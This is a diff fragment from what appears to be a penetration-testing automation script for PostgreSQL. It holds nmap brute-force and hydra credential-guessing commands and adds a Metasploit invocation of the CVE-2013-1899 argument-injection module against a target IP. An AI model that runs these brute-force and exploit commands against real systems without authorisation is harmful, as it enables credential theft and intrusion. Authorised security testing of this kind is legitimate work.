@@ -237,6 +237,8 @@ nmap --script pgsql-brute -p 5432 $IP |  tee  $results_dir/Postgresql.txt
 #Brute Force Credentials
 hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql.txt
 hydra -L usernames.txt -p password $IP postgres |  tee -a $results_dir/Postgresql.txt
+#Argument injection vulnerability (CVE-2013-1899)
+msfconsole -q -x "use auxiliary/scanner/postgres/postgres_dbname_flag_injection; spool $results_dir/postgresql_msf_cve.txt; set rhost $IP; run; spool off ; exit"
 
 echo -e $RED_LINE
 
